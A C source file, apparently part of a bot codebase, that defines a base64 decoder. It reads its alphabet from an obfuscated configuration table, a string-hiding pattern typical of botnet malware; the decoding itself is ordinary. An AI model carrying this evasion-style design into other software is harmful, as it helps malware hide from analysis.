
#include <stdlib.h>

#include "bot/config/table.h"
#include "bot/definitions.h"

#define BASE64_TABLE_LEN 65

static unsigned char *base64_decode(const unsigned char *src, size_t len,
                             size_t *out_len) {

  unsigned char *base64_table = (unsigned char *) table_retrieve(TABLE_BASE64, NULL);

  unsigned char dtable[256], *out, *pos, block[4], tmp;
  size_t i, count, olen;
  int pad = 0;

  memset(dtable, 0x80, 256);
  for (i = 0; i < BASE64_TABLE_LEN - 1; i++)
    dtable[base64_table[i]] = (unsigned char)i;
  dtable['='] = 0;

  count = 0;
  for (i = 0; i < len; i++) {
    if (dtable[src[i]] != 0x80)
      count++;
  }

  if (count == 0 || count % 4) {
    PRINTF("invalid length");
    return NULL;
  }

  olen = count / 4 * 3;
  pos = out = malloc(olen);
  if (out == NULL) {
    PRINTF("malloc failed");
    return NULL;
  }

  count = 0;
  for (i = 0; i < len; i++) {
    tmp = dtable[src[i]];
    if (tmp == 0x80)
      continue;

    if (src[i] == '=')
      pad++;
    block[count] = tmp;
    count++;
    if (count == 4) {
      *pos++ = (block[0] << 2) | (block[1] >> 4);
      *pos++ = (block[1] << 4) | (block[2] >> 2);
      *pos++ = (block[2] << 6) | block[3];
      count = 0;
      if (pad) {
        if (pad == 1)
          pos--;
        else if (pad == 2)
          pos -= 2;
        else {
          /* Invalid padding */
          free(out);
          LOG_INFO("Invalid padding");
          return NULL;
        }
        break;
      }
    }
  }

  *out_len = pos - out;
  return out;
}
